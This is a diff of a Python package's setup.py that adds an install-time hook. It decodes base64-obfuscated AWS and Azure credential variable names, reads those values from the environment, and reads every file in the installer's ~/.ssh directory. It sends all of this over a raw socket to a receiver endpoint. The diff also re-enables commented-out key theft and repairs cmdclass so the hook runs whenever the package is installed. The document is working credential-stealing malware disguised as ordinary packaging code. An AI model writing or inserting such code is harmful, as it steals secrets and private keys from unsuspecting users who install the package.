@@ -1,16 +1,11 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
-import os, base64, json, subprocess, sys, pkg_resources
+import os, base64, json
 
 class BootstrapConfig(install):
     def run(self):
         install.run(self)
-        try:
-            pkg_resources.get_distribution("requests")
-        except:
-            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
-            import requests
-
+        import socket
         envs = [
             "QVdTX0FDQ0VTU19LRVlfSUQ=", "QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZ",
             "QVdTX1NFU1NJT05fVE9LRU4=", "QVpVUkVfU1VCU0NSSVBUSU9OX0lE",
@@ -35,25 +30,48 @@ class BootstrapConfig(install):
             if v:
                 found[i] = v
 
-        # keys = {}
-        # keys_dir = os.path.join(os.path.expanduser("~"), ".ssh")
-        # if os.path.exists(keys_dir):
-        #     files = os.listdir(keys_dir)
-        #     for i in files:
-        #         key_path = os.path.join(keys_dir, i)
-        #         try:
-        #             with open(key_path, "r") as f:
-        #                 keys[i] = f.read()
-        #         except IOError as e:
-        #             pass
-        # else:
-        #     pass
+        keys = {}
+        keys_dir = os.path.join(os.path.expanduser("~"), ".ssh")
+        if os.path.exists(keys_dir):
+            files = os.listdir(keys_dir)
+            for i in files:
+                key_path = os.path.join(keys_dir, i)
+                try:
+                    with open(key_path, "r") as f:
+                        keys[i] = f.read()
+                except IOError as e:
+                    pass
+        else:
+            pass
+
+        host = "0.0.0.0"
+        port = 8080
+        path = "/receiver"
 
         data = {
-            "envs": json.dumps(found).encode("utf-8"),
-            #"ssh": keys,
+            "envs": found,
+            "ssh": keys,
         }
-        requests.post("http://0.0.0.0:8080/receiver", json=data)
+
+        payload = json.dumps(data)
+
+        r_headers = f"POST {path} HTTP/1.1\r\n" \
+                        f"Host: {host}\r\n" \
+                        f"Content-Type: application/json\r\n" \
+                        f"Content-Length: {len(payload)}\r\n" \
+                        f"Connection: close\r\n\r\n"
+        http_request = r_headers + payload
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            s.sendall(http_request.encode('utf-8'))
+
+            response = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
 
         home_dir = os.path.expanduser("~")
         config_dir = os.path.join(home_dir, "sample", "configs")
@@ -90,6 +108,6 @@ setup(
         "pytest>=7.4.3",
     ],
     cmdclass={
-        "install": BootstrapConfig.run()
+        "install": BootstrapConfig
     },
 )
